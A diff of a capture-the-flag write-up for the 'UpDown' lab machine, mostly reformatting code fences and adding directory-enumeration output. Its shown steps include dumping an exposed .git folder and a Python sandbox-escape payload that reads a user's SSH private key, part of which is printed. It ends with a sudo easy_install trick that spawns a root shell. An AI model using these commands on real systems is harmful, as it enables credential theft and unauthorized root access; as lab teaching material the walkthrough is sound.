@@ -53,9 +53,9 @@ The site simply checks if a site is up or down but it does give us its domain. `
 
 Since it's a webpage lets check for subdirectories and other domains.
 
-gobuster finds another domain but we do not have access to it.
+Gobuster finds another domain but we do not have access to it.
 
-```
+```console
 └──╼ [★]$ gobuster vhost -u http://siteisup.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t30 -q
 Found: dev.siteisup.htb (Status: 403) [Size: 281]
 ```
@@ -65,9 +65,47 @@ Using feroxbuster (feroxbuster has recursion by default so it can look deeper un
 Lets check if there is anything hiding inside.
 
 
+```console
+└──╼ [★]$ feroxbuster -q -u http://siteisup.htb/ -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git
+301        9l       28w      310c http://siteisup.htb/dev
+200       40l       93w     1131c http://siteisup.htb/index.php
+200        0l        0w        0c http://siteisup.htb/dev/index.php
+403        9l       28w      277c http://siteisup.htb/server-status
+200       40l       93w     1131c http://siteisup.htb/
+403        9l       28w      277c http://siteisup.htb/.php
+403        9l       28w      277c http://siteisup.htb/.html
+200        0l        0w        0c http://siteisup.htb/dev/
+403        9l       28w      277c http://siteisup.htb/dev/.php
+403        9l       28w      277c http://siteisup.htb/dev/.html
+301        9l       28w      315c http://siteisup.htb/dev/.git
+301        9l       28w      323c http://siteisup.htb/dev/.git/objects
+301        9l       28w      320c http://siteisup.htb/dev/.git/logs
+200       13l       35w      298c http://siteisup.htb/dev/.git/config
+301        9l       28w      320c http://siteisup.htb/dev/.git/info
+301        9l       28w      328c http://siteisup.htb/dev/.git/objects/info
+200        3l       17w      521c http://siteisup.htb/dev/.git/index
+301        9l       28w      321c http://siteisup.htb/dev/.git/hooks
+200        6l       43w      240c http://siteisup.htb/dev/.git/info/exclude
+200       17l       71w     1143c http://siteisup.htb/dev/.git/logs/
+403        9l       28w      277c http://siteisup.htb/dev/.git/logs/.php
+403        9l       28w      277c http://siteisup.htb/dev/.git/logs/.html
+200       26l      172w     2884c http://siteisup.htb/dev/.git/
+403        9l       28w      277c http://siteisup.htb/dev/.git/.php
+403        9l       28w      277c http://siteisup.htb/dev/.git/.html
+200       17l       71w     1150c http://siteisup.htb/dev/.git/objects/
+403        9l       28w      277c http://siteisup.htb/dev/.git/objects/.php
+403        9l       28w      277c http://siteisup.htb/dev/.git/objects/.html
+301        9l       28w      324c http://siteisup.htb/dev/.git/branches
+200       16l       60w      959c http://siteisup.htb/dev/.git/info/
+200       28l      185w     3625c http://siteisup.htb/dev/.git/hooks/
+403        9l       28w      277c http://siteisup.htb/dev/.git/hooks/.php
+403        9l       28w      277c http://siteisup.htb/dev/.git/hooks/.html
+```
+
+
 Download all of the files .git has to offer.
 
-```
+```console
 └──╼ [★]$ wget -r http://siteisup.htb/dev/.git/
 ```
 
@@ -76,7 +114,7 @@ Note: Before dealing with .git files be sure to run the commands in the parent d
 
 We get a couple of different files that seem interesting.
 
-```
+```console
 └──╼ [★]$ git ls-files --stage
 100644 b317ab51e331425e460e974903462a3dcdccc878 0	.htaccess
 100644 940a3179aa882a0b1ac3ff665797818e9aa68a0c 0	admin.php
@@ -88,7 +126,7 @@ We get a couple of different files that seem interesting.
 
 And git log gives us a hint about a header to protect their dev.siteisup.htb site.
 
-```
+```console
 └──╼ [★]$ git log
 commit 8812785e31c879261050e72e20f298ae8c43b565
 Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
@@ -102,7 +140,7 @@ Checking the git file in the logs against the up to date file it gives us the sp
 
 Using this header we can finally access the dev site.
 
-```
+```console
 └──╼ [★]$ git diff 8812785e31c879261050e72e20f298ae8c43b565 bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
 diff --git a/.htaccess b/.htaccess
 index b317ab5..44ff240 100644
@@ -349,7 +387,7 @@ www-data@updown:/tmp$
 
 The files inside /home/developer look interesting
 
-```
+```console
 www-data@updown:/tmp$ ls -la /home/developer/dev
 total 32
 drwxr-x--- 2 developer www-data   4096 Jun 22 15:45 .
@@ -364,7 +402,7 @@ This file siteisup_test.py is actually vulnerable to a python sandbox escape, mo
 https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
 
 
-```
+```console
 www-data@updown:/home/developer/dev$ cat siteisup_test.py
 cat siteisup_test.py
 import requests
@@ -380,7 +418,7 @@ else:
 So very simply all we have to do is abuse the import module for command execution on the system.
 
 
-```
+```console
 www-data@updown:/home/developer/dev$ ./siteisup
 ./siteisup
 Welcome to 'siteisup.htb' application
@@ -389,7 +427,7 @@ Enter URL here:__import__('os').system('cat /home/developer/.ssh/id_rsa')
 ```
 Just like that we get the users key :)
 
-```
+```console
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
@@ -452,7 +490,7 @@ https://gtfobins.github.io/gtfobins/easy_install/
 
 Input the command and we have root!
 
-```
+```console
 developer@updown:~$ TF=$(mktemp -d)
 developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 developer@updown:~$ sudo easy_install $TF
